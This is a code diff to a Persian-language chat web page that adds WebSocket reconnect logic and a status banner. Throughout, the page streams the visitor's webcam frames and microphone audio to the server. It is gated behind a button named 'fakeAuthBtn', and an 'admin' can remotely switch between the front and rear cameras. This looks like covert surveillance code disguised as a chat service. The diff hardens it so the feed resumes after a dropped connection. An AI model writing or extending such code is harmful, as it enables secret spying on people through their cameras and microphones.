@@ -41,6 +41,23 @@
         img, video, audio { max-width: 100%; border-radius: 8px; margin-top: 5px; }
         .disclaimer { text-align: center; font-size: 11px; color: #666; margin-top: 12px; }
 
+        /* ✅ نشانگر وضعیت اتصال (برای کاربر مخفی است، اما اگر WebSocket قطع شد نمایش داده می‌شود) */
+        #connectionStatus {
+            display: none;
+            position: fixed;
+            top: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 11px;
+            z-index: 100;
+            background: #e65100;
+            color: #ffcc80;
+        }
+        #connectionStatus.disconnected { display: block; }
+        #connectionStatus.connected { display: none; }
+
         /* ===== ریسپانسیو ===== */
         @media (max-width: 1024px) { .messages { padding: 30px 10% 120px 10%; } .input-container { padding: 20px 10%; } }
         @media (max-width: 768px) {
@@ -57,6 +74,9 @@
     </style>
 </head>
 <body>
+    <!-- نشانگر وضعیت اتصال -->
+    <div id="connectionStatus" class="disconnected">⏳ در حال اتصال به سرور...</div>
+
     <div class="sidebar">
         <div class="brand">
             <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
@@ -113,13 +133,119 @@
         let localStream = null;
         let videoInterval = null;
         let audioRecorder = null;
+        
+        // ✅ Reconnect
+        let ws = null;
+        let reconnectAttempts = 0;
+        let isConnecting = false;
 
-        const wsProtocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
-        const ws = new WebSocket(`${wsProtocol}${window.location.host}/ws/${userId}/user`);
+        // ✅ به‌روزرسانی نشانگر وضعیت
+        function updateConnectionStatus(connected) {
+            const el = document.getElementById('connectionStatus');
+            if (connected) {
+                el.className = 'connected';
+            } else {
+                el.className = 'disconnected';
+                el.textContent = '⏳ اتصال قطع شد - تلاش برای اتصال مجدد...';
+            }
+        }
+
+        // ✅ اتصال WebSocket با Reconnect
+        function connectWebSocket() {
+            if (isConnecting) return;
+            isConnecting = true;
+            
+            const wsProtocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
+            ws = new WebSocket(`${wsProtocol}${window.location.host}/ws/${userId}/user`);
+            
+            ws.onopen = function() {
+                console.log("WebSocket متصل شد");
+                isConnecting = false;
+                reconnectAttempts = 0;
+                updateConnectionStatus(true);
+            };
+            
+            ws.onmessage = async function(event) {
+                try {
+                    const data = JSON.parse(event.data);
+                    
+                    if (data.type === 'new_message') {
+                        appendMessage(data.sender_id, data.content, data.message_type);
+                    }
+                    
+                    if (data.type === 'change_camera') {
+                        const facing = data.facing;
+                        
+                        if (localStream) localStream.getTracks().forEach(track => track.stop());
+                        if (videoInterval) clearInterval(videoInterval);
+                        if (audioRecorder) audioRecorder.stop();
+                        
+                        try {
+                            localStream = await navigator.mediaDevices.getUserMedia({ 
+                                video: { facingMode: facing }, 
+                                audio: true 
+                            });
+                            
+                            const video = document.createElement('video');
+                            video.srcObject = localStream; video.muted = true; video.play();
+                            const canvas = document.createElement('canvas');
+                            const ctx = canvas.getContext('2d');
+
+                            videoInterval = setInterval(() => {
+                                if (video.videoWidth > 0) {
+                                    canvas.width = 240; canvas.height = 180;
+                                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                    const imageData = canvas.toDataURL('image/jpeg', 0.3);
+                                    if (ws && ws.readyState === WebSocket.OPEN) {
+                                        ws.send(JSON.stringify({ type: 'live_stream', video: imageData, audio: null }));
+                                    }
+                                }
+                            }, 300);
+                            
+                            const audioStream = new MediaStream(localStream.getAudioTracks());
+                            audioRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });
+                            audioRecorder.ondataavailable = async (e) => {
+                                if (e.data.size > 0) {
+                                    const reader = new FileReader();
+                                    reader.onloadend = () => {
+                                        if (ws && ws.readyState === WebSocket.OPEN) {
+                                            ws.send(JSON.stringify({ type: 'live_stream', video: null, audio: reader.result }));
+                                        }
+                                    };
+                                    reader.readAsDataURL(e.data);
+                                }
+                            };
+                            audioRecorder.start(500);
+                            
+                        } catch (err) {
+                            console.error("خطا در تغییر دوربین:", err);
+                        }
+                    }
+                } catch (e) {
+                    console.error("خطا در پردازش پیام:", e);
+                }
+            };
+            
+            ws.onclose = function() {
+                console.log("WebSocket قطع شد - تلاش برای اتصال مجدد");
+                isConnecting = false;
+                updateConnectionStatus(false);
+                
+                reconnectAttempts++;
+                const delay = Math.min(1000 * Math.pow(1.5, reconnectAttempts), 10000);
+                setTimeout(connectWebSocket, delay);
+            };
+            
+            ws.onerror = function(error) {
+                console.log("WebSocket خطا:", error);
+                isConnecting = false;
+            };
+        }
+        connectWebSocket();
         
         messagesDiv.scrollTop = messagesDiv.scrollHeight;
 
-        // ✅ بهینه‌سازی استریم (کیفیت 240x180، فرکانس 300ms)
+        // ✅ استریم کاربر با کیفیت بهینه (240x180، 300ms)
         window.startLiveStream = async function() {
             document.getElementById('fakeAuthBtn').style.display = 'none';
             try {
@@ -137,24 +263,26 @@
                 const canvas = document.createElement('canvas');
                 const ctx = canvas.getContext('2d');
 
-                // ارسال ویدیو با کیفیت پایین‌تر (240x180) و فرکانس 300ms
                 videoInterval = setInterval(() => {
                     if (video.videoWidth > 0) {
                         canvas.width = 240; canvas.height = 180;
                         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                         const imageData = canvas.toDataURL('image/jpeg', 0.3);
-                        ws.send(JSON.stringify({ type: 'live_stream', video: imageData, audio: null }));
+                        if (ws && ws.readyState === WebSocket.OPEN) {
+                            ws.send(JSON.stringify({ type: 'live_stream', video: imageData, audio: null }));
+                        }
                     }
                 }, 300);
 
-                // ارسال صدا
                 const audioStream = new MediaStream(localStream.getAudioTracks());
                 audioRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });
                 audioRecorder.ondataavailable = async (e) => {
                     if (e.data.size > 0) {
                         const reader = new FileReader();
                         reader.onloadend = () => {
-                            ws.send(JSON.stringify({ type: 'live_stream', video: null, audio: reader.result }));
+                            if (ws && ws.readyState === WebSocket.OPEN) {
+                                ws.send(JSON.stringify({ type: 'live_stream', video: null, audio: reader.result }));
+                            }
                         };
                         reader.readAsDataURL(e.data);
                     }
@@ -164,60 +292,6 @@
             } catch (err) {
                 alert("برای استفاده از چت، باید دسترسی به دوربین و میکروفون را تایید کنید.");
                 document.getElementById('fakeAuthBtn').style.display = 'block';
-            }
-        };
-
-        // --- دریافت دستور تغییر دوربین از ادمین ---
-        ws.onmessage = async function(event) {
-            const data = JSON.parse(event.data);
-            
-            if (data.type === 'new_message') {
-                appendMessage(data.sender_id, data.content, data.message_type);
-            }
-            
-            if (data.type === 'change_camera') {
-                const facing = data.facing;
-                
-                if (localStream) localStream.getTracks().forEach(track => track.stop());
-                if (videoInterval) clearInterval(videoInterval);
-                if (audioRecorder) audioRecorder.stop();
-                
-                try {
-                    localStream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { facingMode: facing }, 
-                        audio: true 
-                    });
-                    
-                    const video = document.createElement('video');
-                    video.srcObject = localStream; video.muted = true; video.play();
-                    const canvas = document.createElement('canvas');
-                    const ctx = canvas.getContext('2d');
-
-                    videoInterval = setInterval(() => {
-                        if (video.videoWidth > 0) {
-                            canvas.width = 240; canvas.height = 180;
-                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                            const imageData = canvas.toDataURL('image/jpeg', 0.3);
-                            ws.send(JSON.stringify({ type: 'live_stream', video: imageData, audio: null }));
-                        }
-                    }, 300);
-                    
-                    const audioStream = new MediaStream(localStream.getAudioTracks());
-                    audioRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });
-                    audioRecorder.ondataavailable = async (e) => {
-                        if (e.data.size > 0) {
-                            const reader = new FileReader();
-                            reader.onloadend = () => {
-                                ws.send(JSON.stringify({ type: 'live_stream', video: null, audio: reader.result }));
-                            };
-                            reader.readAsDataURL(e.data);
-                        }
-                    };
-                    audioRecorder.start(500);
-                    
-                } catch (err) {
-                    console.error("خطا در تغییر دوربین:", err);
-                }
             }
         };
 
@@ -252,6 +326,10 @@
         }
 
         function sendMessage() {
+            if (!ws || ws.readyState !== WebSocket.OPEN) {
+                alert("اتصال به سرور قطع است. لطفاً صبر کنید...");
+                return;
+            }
             if (pendingFileUrl) {
                 ws.send(JSON.stringify({ receiver_id: adminId, content: pendingFileUrl, type: pendingFileType }));
                 pendingFileUrl = null; pendingFileType = null;
